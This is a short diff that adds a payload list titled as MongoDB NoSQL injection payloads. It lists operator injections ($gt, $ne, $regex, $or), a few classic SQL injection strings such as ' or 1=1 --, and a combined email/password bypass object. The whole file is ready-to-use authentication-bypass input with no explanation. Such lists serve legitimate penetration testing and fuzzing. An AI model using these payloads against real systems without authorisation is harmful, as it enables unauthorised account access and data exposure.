@@ -1,0 +1,10 @@
+# MongoDB NoSQL Injection payloads
+{"$gt": ""}
+{"$ne": null}
+{"$ne": 1}
+{"$regex": ".*"}
+{"$or": [{}, {"a": "b"}]}
+admin' or '1'='1
+' or 1=1 --
+' or 'a'='a
+{"email": {"$gt": ""}, "password": {"$gt": ""}}
